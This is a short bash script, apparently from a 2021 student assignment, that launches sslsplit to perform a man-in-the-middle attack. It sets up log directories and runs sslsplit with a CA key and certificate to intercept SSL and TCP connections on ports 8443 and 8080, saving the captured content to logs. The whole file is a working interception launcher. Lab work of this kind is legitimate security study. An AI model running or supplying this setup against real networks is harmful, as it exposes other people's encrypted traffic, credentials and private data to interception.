#!/bin/bash
#Author: Kuan-Ju Chen
#Date: 2021/04/12
#ID: 0711529
#Describe: launch the sslsplit to make mitm attack
mkdir -p /tmp/sslsplit/
mkdir -p ./logdir/
# use -d to run in background or can use -D to run in Debug mode
sslsplit -l connections.log -d -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080